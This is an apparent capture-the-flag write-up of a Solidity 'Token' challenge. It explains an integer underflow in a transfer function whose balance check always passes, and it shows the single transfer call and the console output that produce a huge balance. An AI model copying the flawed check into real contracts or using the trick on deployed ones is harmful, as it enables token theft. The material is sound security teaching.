# Token

The objective of the contract is to have a bunch of tokens. 

The code for the contract is below.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

Looking over this code the application is vulnerable to an interger underflow. When an unsigned integer goes below 0 it underflows and resets to the max value that it can hold. When using the transfer function there is no check if the number being sent is more then the balance. Instead the check is to subtract the numbers (causing the underflow) and compare that number to 0. 

In order to solve this challenge another address was needed. Simply another wallet was created in the metamask extension. Then using this other address the player account was used to send 21 tokens to the other account. We start with 20. This action is what causes the underflow.

```js
contract.transfer("0x695d355AE7547e685257C74B12e94b31B4b03745", 21)

await contract.balanceOf(player)
o {negative: 0, words: Array(11), length: 10, red: null}
length: 10
negative: 0
red: null
words: (11) [67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 4194303, empty]
```